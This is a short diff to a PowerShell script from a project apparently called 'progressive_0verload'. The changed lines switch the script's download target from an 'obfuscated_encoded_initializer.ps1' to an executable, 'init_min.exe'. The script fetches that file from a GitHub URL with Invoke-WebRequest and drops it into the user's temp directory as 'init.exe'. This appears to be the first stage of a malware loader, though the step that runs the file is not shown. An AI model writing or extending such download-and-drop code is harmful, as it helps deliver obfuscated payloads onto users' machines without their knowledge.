@@ -1,6 +1,6 @@
 $currLoc = $MyInvocation.MyCommand.Path
-$init_uri = "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/initializers/obfuscated_encoded_initializer.ps1"
-$scriptPath = "$env:temp\initializer.ps1"
+$init_uri = "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/initializers/init_min.exe"
+$scriptPath = "$env:temp\init.exe"
 
 iwr -Uri $init_uri -OutFile $scriptPath
 
